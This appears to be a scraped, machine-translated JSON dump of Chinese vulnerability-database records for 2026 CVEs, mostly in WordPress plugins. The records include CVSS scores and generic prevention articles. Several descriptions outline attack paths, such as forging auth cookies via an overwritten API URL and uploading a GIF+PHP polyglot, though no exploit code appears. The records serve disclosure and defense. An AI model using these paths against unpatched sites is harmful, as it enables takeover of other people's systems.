"security@wordfence.com", "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", "severity": "high", "base_score": 8.8}]}, "cvss_score": 8.8, "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", "cwe": "CWE-269", "description": "bLoyal：WordPress 的 bLoyal 插件的忠诚度和促销在 3.1.611.78 及之前的所有版本中都容易受到权限升级的影响。这是由于 AJAX 操作 `save_bloyal_configuration_data` 和 `save_bloyal_accesskeyverification_data` 在没有任何功能或随机数检查的情况下注册，并且 `bloyal_customer_auto_login` 函数无条件信任存储在插件选项中的 API URL 返回的 `Customer.ExternalId` 值。这使得具有订阅者级及以上访问权限的经过身份验证的攻击者可以通过不受保护的 AJAX 操作覆盖插件的 bLoyal Loyalty Engine API URL (`bloyal_custom_loyaltyengine_api_url`) 和 `is_bloyal_custom_api_url` 标志，然后触发未经身份验证的 `/cart` REST 路由以导致 `bloyal_customer_auto_login` 获取客户来自攻击者控制的端点的数据，并使用攻击者提供的“Customer.ExternalId”调用“wp_set_auth_cookie()”，从而以包括站点管理员在内的任何 WordPress 用户身份进行身份验证。", "effects": [], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "低", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "权限管理不当", "kind_en": "权限管理不当", "last_modified_time": "2026-08-15", "level": "High", "mps_id": "MPS-4bw3-e12f", "poc": false, "poc_url": [], "published_time": "2026-08-15", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-4bw3-e12f", "name": "https://www.oscs1024.com/hd/MPS-4bw3-e12f"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-15001", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-15001"}, {"url": "https://plugins.trac.wordpress.org/browser/bloyal/tags/3.1.611.78/app/controller/class-bloyalcontroller.php#L2429", "name": ""}, {"url": "https://plugins.trac.wordpress.org/browser/bloyal/tags/3.1.611.78/app/controller/class-bloyalcontroller.php#L2470", "name": ""}, {"url": "https://plugins.trac.wordpress.org/browser/bloyal/tags/3.1.611.78/app/controller/class-bloyalcontroller.php#L2512", "name": ""}, {"url": "https://plugins.trac.wordpress.org/browser/bloyal/tags/3.1.611.78/app/controller/class-bloyalcontroller.php#L421", "name": ""}, {"url": "https://plugins.trac.wordpress.org/browser/bloy /UI:N/S:U/C:H/I:H/A:H", "cwe": "CWE-269", "description": "WordPress 的批发市场插件在 2.2.2 及以下版本中很容易通过 ced_wholesale_request_send AJAX 操作进行权限升级。 ced_wholesale_request_send_callback() 处理程序仅验证随机数（通过前端的 wp_localize_script 向任何经过身份验证的用户公开）以及调用者是否具有肯定的用户 ID，然后使用客户端提供的 role_required POST 参数调用 WP_User::add_role() ，而不将该值限制为批发角色的白名单。当站点管理员启用“直接分配请求的角色”选项时，经过身份验证的具有订阅者级别及以上访问权限的攻击者可以将其权限提升为管理员。", "effects": [], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "低", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "权限管理不当", "kind_en": "权限管理不当", "last_modified_time": "2026-08-15", "level": "High", "mps_id": "MPS-5js9-w4vb", "poc": false, "poc_url": [], "published_time": "2026-08-15", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-5js9-w4vb", "name": "https://www.oscs1024.com/hd/MPS-5js9-w4vb"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-14279", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-14279"}, {"url": "https://plugins.trac.wordpress.org/browser/wholesale-market/tags/2.2.2/addons/wholesale-request/include/class-wholesale-user-register-addon.php#L141", "name": ""}, {"url": "https://plugins.trac.wordpress.org/browser/wholesale-market/tags/2.2.2/addons/wholesale-request/include/class-wholesale-user-register-addon.php#L153", "name": ""}, {"url": "https://plugins.trac.wordpress.org/browser/wholesale-market/tags/2.2.2/addons/wholesale-request/include/class-wholesale-user-register-addon.php#L276", "name": ""}, {"url": "https://plugins.trac.wordpress.org/browser/wholesale-market/tags/2.2.2/addons/wholesale-request/include/class-wholesale-user-register-addon.php#L30", "name": ""}, {"url": "https://www.wordfence.com/threat-intel/vulnerabilities/id/abd59d7a-e7f6-440d-9c2a-00266c0dcbff?source=cve", "name": ""}], "scope_influence": "", "tags": [], "title": "CVE-2026-14279漏洞", "_translated": true, "_saved_at": "2026-08-15T14:16:11+00:00", "_first_saved_at": "2026-08-15T08:20:24+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-5js9-w4vb"}, {"analysis_status": 0, "articles": [{"content": "- 程序未正确处理用户上传的文件，从而导致程序可以读取、处理或存储未经授权的文件\n", "title": "什么是任意文件上传"}, {"content": "- 欺骗攻击：攻击者可以通过发送伪造的文件来欺骗程序，从而导致程序读取、处理或存储未经授权的文件。\n- 文件格式攻击：攻击者可以通过选择特定的文件格式，例如压缩文件或 ZIP 文件，从而利用上传的文件来篡改程序的执行结果或窃取程序中的重要数据。\n", "title": "任意文件上传常见的攻击方式"}, {"content": "- 使用安全文件传输协议 (FTP):使用安全 FTP 协议可以确保上传的文件格式、大小、权限等符合预期，同时可以防止文件读取、篡改或存储漏洞。\n- 使用文件上传过滤器：使用文件上传过滤器可以过滤上传的文件，以确保文件的格式、大小、权限等符合预期，同时可以防止文件读取、篡改或存储漏洞。\n- 使用白名单机制：使用白名单机制可以只允许特定的文件格式、大小、权限等存在的文件上传，从而防止非法文件的上传和攻击。\n- 定期更新和升级程序：定期更新和升级程序可以修复已知的漏洞，并增强程序的安全性。", "title": "如何预防任意文件上传"}], "cnvd_id": "", "cve_id": "CVE-2026-18438", "cvss": {"cvssv31": [{"source": "security@wordfence.com", "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", "severity": "high", "base_score": 8.8}]}, "cvss_score": 8.8, "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", "cwe": "CWE-434", "description": "Templately – Elementor 和 Gutenberg 模板库：6500 多个免费和专业版模板和云！ WordPress 插件在 3.7.1 及之前的所有版本中都容易通过 fetch_remote_file 函数受到远程代码执行的攻击。这是由于 fetch_remote_file 中的文件名验证/目标不匹配，其中文件类型验证是针对攻击者控制的内容处置文件名而不是 URL 路径派生的目标文件名执行的。这使得具有贡献者级别及以上访问权限的经过身份验证的攻击者可以在服务器上执行代码。 GIF+PHP 多语言文件通过 Content-Disposition 文件名将 wp_check_filetype_and_ext 验证为 image/gif，而实际目标路径是使用从 URL 路径派生的 .php 扩展名编写的，完全绕过了 unfiltered_upload 功能门。受影响的端点可以在此权限级别访问，因为 Templately 的整个 REST API（包括此攻击中使用的云导入端点（/templately/v1/clouds/upload 和 /templately/v1/insert））仅由 current_user_can('delete_posts') 检查授权，没有管理员或管理选项功能要求。相同的权限门还允许贡献者通过 /templately/v1/login 端点覆盖站点的全局 Templately 云连接，并将 global_signin 设置为 true。完整的补救措施应该纠正 fetch_remote_file 以根据实际目标文件名而不是 Content-Disposition 标头验证文件类型（并避免从请求 URL 派生写入路径），并将状态更改模板 REST 路由限制为适当的管理员级别功能。", "effects": [], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "低", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "任意文件上传", "kind_en": "危险类型文件无限制上传", "last_modified_time": "2026-08-15", "level": "High", "mps_id": "MPS-saen-omwx", "poc": false, "poc_url": [], "published_tim ess 的多合一客户端管理系统插件在 1.7.8 及之前的所有版本中都容易受到权限升级的影响。这是由于“create()”函数的 REST 端点无法根据允许的 WordPress 角色白名单验证用户提供的“role”参数，并且在将清理后的值直接传递给“WP_User::set_role()”之前忽略任何“promote_users”功能检查。这使得具有“ndpv_manager”级别及以上访问权限的经过身份验证的攻击者可以创建一个分配有“管理员”角色的新 WordPress 用户帐户，从而实现完全垂直权限升级。 “ndpv_manager”功能是 Propovoice 本身授予的子管理员 CRM 团队角色，这意味着攻击面不仅限于站点管理员，还扩展到该插件已提升为经理职位的任何用户。", "effects": [], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "低", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "权限管理不当", "kind_en": "权限管理不当", "last_modified_time": "2026-08-15", "level": "High", "mps_id": "MPS-sc1b-auf0", "poc": false, "poc_url": [], "published_time": "2026-08-15", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-sc1b-auf0", "name": "https://www.oscs1024.com/hd/MPS-sc1b-auf0"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-15312", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-15312"}, {"url": "https://plugins.trac.wordpress.org/browser/propovoice/trunk/includes/Api/Type/Team.php#L169", "name": ""}, {"url": "https://plugins.trac.wordpress.org/browser/propovoice/trunk/includes/Api/Type/Team.php#L219", "name": ""}, {"url": "https://plugins.trac.wordpress.org/browser/propovoice/trunk/includes/Api/Type/Team.php#L38", "name": ""}, {"url": "https://plugins.trac.wordpress.org/browser/propovoice/trunk/includes/Api/Type/Team.php#L423", "name": ""}, {"url": "https://www.wordfence.com/threat-intel/vulnerabilities/id/6a39e4d4-890d-46f9-8bb9-0fc858e6f1e2?source=cve", "name": ""}], "scope_influence": "", "tags": [], "title": "CVE-2026-15312漏洞", "_translated": true, "_saved_at": "2026-08-15T04:23:24+00:00", "_first_saved_at": "2026-08-15T04:23:24+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-sc1b-auf0"}, {"analysis_status": 0, "articles": [{"content": "- 程序未正确处理用户上传的文件，从而导致程序可以读取、处理或存储未经授权的文件\n", "title": "什么是任意文件上传"}, {"content": "- 欺骗攻击：攻击者可以通过发送伪造的文件来欺骗程序，从而导致程序读取、处理或存储未经授权的文件。\n- 文件格式攻击：攻击者可以通过选择特定的文件格式，例如压缩文件或 ZIP 文件，从而利用上传的文件来篡改程序的执行结果或窃取程序中的重要数据。\n", "title": "任意文件上传常见的攻击方式"}, {"content": "- 使用安全文件传输协议 (FTP):使用安全 FTP 协议可以确保上传的文件格式、大小、权限等符合预期，同时可以防止文件读取、篡改或存储漏洞。\n- 使用文件上传过滤器：使用文件上传过滤器可以过滤上传的文件，以确保文件的格式、大小、权限等符合预期，同时可以防止文件读取、篡改或存储漏洞。\n- 使用白名单机制：使用白名单机制可以只允许特定的文件格式、大小、权限等存在的文件上传，从而防止非法文件的上传和攻击。\n- 定期更新和升级程序：定期更新和升级程序可以修复已知的漏洞，并增强程序的安全性。", "title": "如何预防任意文件上传"}], "cnvd_id": "", "cve_id": "CVE-2026-15965", "cvss": {"cvssv31": [{"source": "security@wordfence.com", "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", "severity": "high", "base_score": 8.8}]}, "cvss_score": 8.8, "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", "cwe": "CWE-434", "description": "WordPress 的 MaxUpload – 大文件上传 – 增加最大文件上传大小插件在 1.4.0 及之前的所有版本中都容易通过 handle_upload 函数受到任意文件上传的攻击。这是由于 handle_upload 函数中的文件名验证不匹配，其中扩展名和 MIME 检查应用于上传块的文件名，但不适用于从 resumableFilename 参数派生的最终组装文件名。这使得未经身份验证的攻击者可以上传可执行的文件，从而使远程代码执行成为可能。", "effects": [], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "低", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "任意文件上传", "kind_en": "危险类型文件无限制上传", "last_modified_time": "2026-08-15", "level": "High", "mps_id": "MPS-u21h-4gti", "poc": false, "poc_url": [], "published_time": "2026-08-15", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-u21h-4gti", "name": "https://www.oscs1024.com/hd/MPS-u21h-4gti"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-15965", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-15965"}, {"url": "https://plugins.trac.wordpress.org/browser/maxupload-upload-larger-files-easily/tags/1.4.0/includes/uploader.php#L121", "name": ""}, {"url": "https://plugins.trac.wordpress.org/browser/maxupload-upload-larger-files-easily/tags/1.4.0/includes/uploader.php#L174", "name": ""}, {"url": "https://plugins.trac.wordpress.org/browser/maxupload-upload-larger-files-easily/tags/1.4.0/includes/uploader.php#L19", "name": ""}, {"url": "https://plugins.trac.wordpress.org/browser/maxupload-upload-larger-files-easily/tags/1.4.0/includes/uploader.php#L201", "name": ""}, {"url": "https://plugins.trac.wordpress.org/browser/maxupload-upload-larger-files-easily/tags/1.4.0/maxupload-wp.php#L88", "name": ""}, {"url": "https://www.wordfence.com/threat-intel/vulnerabilities/id/70d90c0c-e3c6-4db9-b16d-1442e7e1dc3b?source=cve", "name": ""}], "scope_influence": "", "tags": [], "title": "CVE-2026-15965漏洞", "_translated": true, "_saved_at": "2026-08-15T04:23:22+00:00", "_first_saved_at": "2026-08-15T04:23:22+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-u21h-4gti"}, {"analysis_status": 0, "articles": [{"content": "应用程序未能正确验证和过滤用户输入，将用户提供的数据直接用作操作系统命令的一部分。攻击者可以利用这个漏洞，通过注入恶意的操作系统命令来执行任意系统命令、获取敏感信息或者对系统进行未授权的操作。", "title": "什么是OS命令注入"}, {"content": "- 命令拼接：应用程序将用户输入直接拼接到操作系统命令中，而不进行合适的过滤和验证。攻击者可以通过在输入中注入特殊字符、命令分隔符等，来执行额外的命令或修改原始命令的行为。\r\n- 命令注释：攻击者通过在输入中注入特殊字符或命令注释符号，如\"#\"或\"//\"，来注释掉原始命令中的一部分，然后执行自己的恶意命令。\r\n- 命令管道：攻击者通过在输入中注入管道符号\"|\"，将多个命令连接起来执行。这使得攻击者可以在单个注入点上执行多个命令，进一步扩大攻击的范围。", "title": "OS命令注入常见的攻击方式"}, {"content": "- 输入验证与过滤：应用程序应该对用户输入进行严格的验证和过滤，确保只接受预期的有效输入。可以使用白名单验证，限制用户输入的字符集和格式，防止特殊字符和命令注释符的注入。\r\n- 使用参数化命令或预编译语句：应该使用参数化命令或预编译语句，而不是将用户输入直接拼接到命令中。这样可以将输入数据视为参数，而不是命令的一部分，从而避免命令注入漏洞。\r\n- 最小特权原则：应用程序在执行操作系统命令时，应该使用最小特权原则，即使用具有最低权限的用户或服务来执行操作。这样即使发生命令注入漏洞，攻击者的权限也会受到限制。\r\n- 安全编码实践：开发人员应避免使用不受信任的用户输入来拼接命令，并使用安全的编码实践，如输入验证、输出编码和参数化查询等。\r\n- 使用Web应用程序防火墙（WAF）：部署Web应用程序防火墙可以帮助检测和阻止命令注入攻击。", "title": "如何预防OS命令注入"}], "cnvd_id": "", "cve_id": "CVE-2026-73680", "cvss": {"cvssv31": [{"source": "disclosure@vulncheck.com", "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", "severity": "high", "base_score": 8.8}], "cvssv4": [{"source": "disclosure@vulncheck.com", "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X", "severity": "high", "base_score": 8.7}]}, "cvss_score": 8.7, "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/A 并将其直接拼接到SQL查询语句中，而没有对输入进行充分的验证和转义时，就会发生SQL注入。攻击者可以通过在输入中插入恶意的SQL代码，改变原始查询的意图，从而执行未经授权的操作或访问敏感数据。", "title": "什么是SQL注入"}, {"content": "- 基于错误的输入过滤：攻击者通过向输入字段中插入特殊字符或SQL语句片段来破坏应用程序的输入过滤机制。这可能导致应用程序执行意外的SQL查询。\n- 基于布尔盲注：攻击者利用应用程序在查询结果中显示的不同响应来确定SQL语句的真假。通过构造特定的查询，攻击者可以逐步推断出数据库的结构和敏感信息。\n- 基于时间的盲注：攻击者通过在SQL查询中插入延迟语句来测试条件的真假。通过测量响应时间的差异，攻击者可以推断出SQL语句的真假和敏感数据的存在性。", "title": "SQL注入常见的攻击方式"}, {"content": "- 使用参数化查询或预编译语句：避免将用户输入直接拼接到SQL查询语句中，而是使用参数化查询或预编译语句。这样可以将用户输入作为参数传递给查询，从而避免了注入攻击。\n- 输入验证和过滤：对用户输入进行充分的验证和过滤，确保输入符合预期的格式和范围。可以使用白名单验证、正则表达式或输入验证库等方法来过滤输入。\n- 最小权限原则：确保数据库用户具有最小的权限，并严格限制其对敏感数据和数据库操作的访问权限。\n- 不透明化敏感数据：对于敏感数据，如密码和信用卡号等，应该使用适当的加密和哈希算法进行存储，以减少数据泄露的风险。\n- 定期更新和维护：及时应用数据库供应商发布的安全补丁和更新，以修复已知的漏洞和弱点。", "title": "如何预防SQL注入"}], "cnvd_id": "", "cve_id": "CVE-2026-73850", "cvss": {"cvssv4": [{"source": "security-advisories@github.com", "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X", "severity": "high", "base_score": 8.6}]}, "cvss_score": 8.6, "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X", "cwe": "CWE-89", "description": "Emlog 是一个开源网站构建系统。在2.6.20及更早版本中，ai.php中的queryDatabase函数存在SQL注入漏洞。", "effects": [], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "低", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "SQL注入", "kind_en": "SQL 命令中使用的特殊元素的不正确中和（“SQL 注入”）", "last_modified_time": "2026-08-15", "level": "High", "mps_id": "MPS-vmlw-02af", "poc": false, "poc_url": [], "published_time": "2026-08-15", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-vmlw-02af", "name": "https://www.oscs1024.com/hd/MPS-vmlw-02af"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-73850", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-73850"}, {"url": " :X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X", "cwe": "CWE-94", "description": "ImpressCMS 在自定义标签模块中包含一个经过身份验证的远程代码执行漏洞，该漏洞允许经过身份验证的管理员通过在启用了 PHP 类型的自定义标签中存储恶意负载来执行任意 PHP 代码。应用程序通过 undoHtmlSpecialChars() 解码 HTML 编码的内容，然后将其传递给 renderWithPhp() 方法中的 eval()，绕过 HTML Purifier 清理，并且通过预加载事件系统在每个前端页面加载时触发有效负载。", "effects": [], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "低", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "代码注入", "kind_en": "代码生成控制不当（“代码注入”）", "last_modified_time": "2026-08-15", "level": "High", "mps_id": "MPS-y6hi-jmtq", "poc": false, "poc_url": [], "published_time": "2026-08-15", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-y6hi-jmtq", "name": "https://www.oscs1024.com/hd/MPS-y6hi-jmtq"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-73679", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-73679"}, {"url": "https://github.com/DevVaibhav07/VULN-POC/blob/main/ImpressCMSRCCE.md", "name": ""}, {"url": "https://github.com/ImpressCMS/impresscms", "name": ""}, {"url": "https://www.vulncheck.com/advisories/impresscms-authenticated-rce-via-php-custom-tag-eval", "name": ""}], "scope_influence": "", "tags": [], "title": "CVE-2026-73679漏洞", "_translated": true, "_saved_at": "2026-08-14T20:25:00+00:00", "_first_saved_at": "2026-08-14T20:25:00+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-y6hi-jmtq"}, {"analysis_status": 0, "articles": [{"content": "- 当攻击者欺骗合法的基于 Web 的应用程序或站点接受来自可信来源的请求时，就会发生跨站点脚本攻击。\r\n- 这是通过转义 Web 应用程序的上下文来完成的； 然后，Web 应用程序将该数据与其他受信任的动态内容一起交付给其用户，而无需对其进行验证。 浏览器不知不觉地在客户端执行恶意脚本（通过客户端语言；通常是 JavaScript 或 HTML）以执行通常被浏览器的同源策略阻止的操作。\r\n- ֿ注入恶意代码是最普遍的XSS利用方式； 因此，转义字符以防止这种操作是保护代码免受此漏洞影响的首要方法。\r\n- 转义意味着应用程序被编码以标记关键字符，特别是用户输入中包含的关键字符，以防止这些字符在危险的上下文中被解释。 例如，在 HTML 中，\u003c 可以编码为 \u0026lt; 并且\u003e可以被编码为\u0026gt; 为了在文本中被解释和显示为它们自己，而在代码本身中，它们被用于 HTML 标记。 如果将恶意内容注入到转义特殊字符的应用程序中，并且该恶意内容使用 \u003c 和 \u003e 作为 HTML 标记，那么如果这些字符在应用程序代码中正确转义，那么这些字符将不会被浏览器解释为 HTML 标记。 转移未遂攻击的方式。\r\n- XSS 最突出的用途是窃取 cookie（来源：OWASP HttpOnly）和劫持用户会话，但 XSS 漏洞已被用于暴露敏感信息、允许访问特权服务和功能以及传播恶意软件。", "title": "什么是XSS"}, {"content": "| 类型        | 描述                                                         |\r\n| ----------- | ------------------------------------------------------------ |\r\n| 存储型      | 攻击者将恶意代码插入到应用程序中（通常作为链接）。 每次用户单击链接时，代码都会被激活。 |\r\n| 反射型      | 攻击者从易受攻击的网站应用程序外部向用户提供恶意链接。 单击时，恶意代码将发送到易受攻击的网站，将攻击反映回用户的浏览器。 |\r\n| 基于 DOM 的 | 攻击者强制用户的浏览器呈现恶意页面。 页面中的数据本身提供跨站点脚本数据。 |\r\n| 变异        | 攻击者注入看似安全的代码，但随后在解析标记时被浏览器重写和修改。 一个例子是重新平衡未闭合的引号，甚至为未引用的参数添加引号。 |", "title": "XSS常见的攻击方式"}, {"content": "- 在将 HTTP 请求中的数据输入反射回来之前对其进行清理，确保在将任何数据回显给用户之前验证、过滤或转义所有数据，例如搜索期间的查询参数值。\r\n- 将特殊字符（如 ?、\u0026、/、\u003c、\u003e 和空格）转换为其各自的 HTML 或 URL 编码等价物。\r\n- 为用户提供禁用客户端脚本的选项。\r\n- 重定向无效请求。\r\n- 检测同时登录，包括来自两个不同 IP 地址的登录，并使这些会话无效。\r\n- 使用并执行内容安全策略（Content Safe Policy）来禁用可能被 XSS 攻击操纵的任何功能。\r\n- 阅读代码中引用的所有库的文档，了解哪些元素允许嵌入 HTML。", "title": "如何预防XSS"}], "cnvd_id": "", "cve_id": "CVE-2026-63361", "cvss": {"cvssv4": [{"source": "help@fluidattacks.com", "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:H/VI:H/VA:N/SC:L/SI:L/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X", "severity": "high", "base_score": 8.5}]}, "cvss_score": 8.5, "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:H/VI:H/VA:N/SC:L/SI:L/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X", "cwe": "CWE-79", "description": "LimeSurvey Community Edition 7.0.5 在 HTML 编辑器弹出端点中包含经过身份验证的反射跨站点脚本漏洞。文本和名称查询参数通过黑名单清理器传递，然后在没有上下文适当的输出编码的情况下进行渲染。", "effects": [], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "低", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "XSS", "kind_en": "网页生成期间输入的不正确中和（“跨站点脚本”）", "last_modified_time": "2026-08-15", "level": "High", "mps_id": "MPS-kbzm-er2d", "poc": false, "poc_url": [], "published_time": "2026-08-15", "reference_url_list": [{"url": "https://w m/hd/MPS-baow-c9xu"}, {"analysis_status": 0, "articles": [], "cnvd_id": "", "cve_id": "CVE-2026-18500", "cvss": {"cvssv31": [{"source": "ce714d77-add3-4f53-aff5-83d477b104bb", "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N", "severity": "high", "base_score": 8.1}]}, "cvss_score": 8.1, "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N", "cwe": "CWE-347", "description": "@fastify/jwt 是 Fastify 的 JSON Web Token 插件。在 10.2.2 之前的版本中，传递给 request.jwtVerify({ key }) 的每个请求验证密钥会被插件的全局配置密钥静默覆盖，因为选项合并最后应用全局密钥。因此，对不同授权域使用不同密钥（例如单独的用户密钥和管理密钥）的应用程序会在明确需要另一个密钥的路由上接受使用全局密钥签名的令牌。这使得普通的经过身份验证的用户可以在不知道任何秘密的情况下跨越基于密钥的信任边界。该问题已在 @fastify/jwt 10.2.2 中修复，其中显式的每次调用密钥优先于全局密钥。用户应升级到10.2.2。", "effects": [], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "低", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "密码学签名的验证不恰当", "kind_en": "密码签名验证不当", "last_modified_time": "2026-08-15", "level": "High", "mps_id": "MPS-z6qk-0oji", "poc": false, "poc_url": [], "published_time": "2026-08-15", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-z6qk-0oji", "name": "https://www.oscs1024.com/hd/MPS-z6qk-0oji"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-18500", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-18500"}, {"url": "https://cna.openjsf.org/security-advisories.html", "name": ""}, {"url": "https://github.com/fastify/fastify-jwt/security/advisories/GHSA-j4cx-787j-xjqg", "name": ""}], "scope_influence": "", "tags": [], "title": "CVE-2026-18500漏洞", "_translated": true, "_saved_at": "2026-08-15T18:19:13+00:00", "_first_saved_at": "2026-08-15T15:14:38+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-z6qk-0oji"}, {"analysis_status": 0, "articles": [], "cnvd_id": "", "cve_id": "CVE-2026-69414", "cvss": {"cvssv31": [{"source": "secure@microsoft.com", "vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", "severity": "high", "base_score": 7.8}]}, "cvss_score": 7.8, "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", "cwe": "", "description": "Microsoft 发现 Microsoft Defender 中的 Microsoft 恶意软件防护引擎存在权限提升，公开称为“ShieldBreak”。\n我们正在努力提供高质量的安全更新来解决此漏洞。当更新可用时，我们将在此 CVE 中提供信息。", "effects": [], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "低", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "", "kind_en": "", "last_modified_time": "2026-08-15", "level": "High", "mps_id": "MPS-87op-dvqb", "poc": false, "poc_url": [], "published_time": "2026-08-15", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-87op-dvqb", "name": "https://www.oscs1024.com/hd/MPS-87op-dvqb"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-69414", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-69414"}, {"url": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-69414", "name": ""}], "scope_influence": "", "tags": [], "title": "CVE-2026-69414漏洞", "_translated": true, "_saved_at": "2026-08-14T23:16:11+00:00", "_first_saved_at": "2026-08-14T23:16:11+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-87op-dvqb"}, {"analysis_status": 0, "articles": [{"content": "- 命令注入是一种攻击，其目标是通过易受攻击的应用程序在主机操作系统上执行任意命令。 当应用程序将不安全的用户提供的数据（表单、cookie、HTTP 标头等）传递到系统 shell 时，就会产生缺陷。攻击者通过构造恶意的命令或数据，将其注入到程序执行的上下文中，从而绕过程序的输入验证和安全措施，实现对程序操作的恶意操作。", "title": "什么是命令注入"}, {"content": "- 文件上传：攻击者通过构造恶意的文件上传请求，将包含恶意命令的文件上传到服务器，从而利用命令注入漏洞执行恶意命令。\n- SQL 注入：攻击者通过构造恶意的 SQL 查询语句，将包含恶意命令的 SQL 语句注入到数据库中，从而执行恶意命令，窃取数据或者破坏系统。\n- 命令执行：攻击者通过在 Web 应用程序的表单提交数据中注入恶意命令，从而执行恶意命令，例如删除文件、格式化硬盘等。\n- 命令注入漏洞的旁路攻击：攻击者可以利用命令注入漏洞旁路控制程序的执行流程，从而窃取数据、破坏系统、控制程序等。\n", "title": "命令注入常见的攻击方式"}, {"content": "- 输入验证：在程序输入处对输入数据进行严格的验证和过滤，确保输入数据符合预期的格式和类型，避免被攻击者注入恶意命令。\n- 输出过滤：在程序输出处对输出数据进行严格的过滤和检查，确保输出数据符合预期的格式和类型，避免被攻击者截获和篡改。\n- 